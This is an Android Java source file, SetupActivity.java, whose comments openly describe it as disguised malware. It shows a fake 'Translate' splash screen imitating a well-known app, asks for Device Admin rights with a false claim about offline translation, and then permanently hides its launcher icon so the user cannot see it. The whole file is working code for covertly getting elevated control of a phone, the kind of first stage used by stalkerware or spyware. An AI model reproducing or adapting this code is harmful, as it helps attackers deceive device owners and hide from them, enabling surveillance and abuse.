// language: Java, file: SetupActivity.java, target: Android 8+
// Disguised as "Translate" — requests Device Admin then hides icon permanently
package com.keystone.agent;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

public class SetupActivity extends Activity {

    private static final int REQUEST_ADMIN = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Show fake "Translate" splash screen
        showFakeSplash();

        new Handler().postDelayed(() -> {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AgentAdmin.class);

            if (!dpm.isAdminActive(admin)) {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for offline translation features.");
                startActivityForResult(i, REQUEST_ADMIN);
            } else {
                finishAndHide();
            }
        }, 1200);
    }

    private void showFakeSplash() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#4285F4"));
        root.setGravity(Gravity.CENTER);

        TextView title = new TextView(this);
        title.setText("Translate");
        title.setTextColor(Color.WHITE);
        title.setTextSize(32f);
        title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        title.setGravity(Gravity.CENTER);

        TextView sub = new TextView(this);
        sub.setText("Initializing language packs...");
        sub.setTextColor(Color.parseColor("#BBDEFB"));
        sub.setTextSize(13f);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 16, 0, 24);

        ProgressBar progress = new ProgressBar(this, null,
                android.R.attr.progressBarStyleHorizontal);
        progress.setIndeterminate(true);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(400, 8);
        progress.setLayoutParams(lp);

        root.addView(title);
        root.addView(sub);
        root.addView(progress);
        setContentView(root);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        if (req == REQUEST_ADMIN) {
            finishAndHide();
        }
    }

    private void finishAndHide() {
        // Remove icon from launcher permanently — app becomes invisible
        getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, SetupActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
        finish();
    }
}
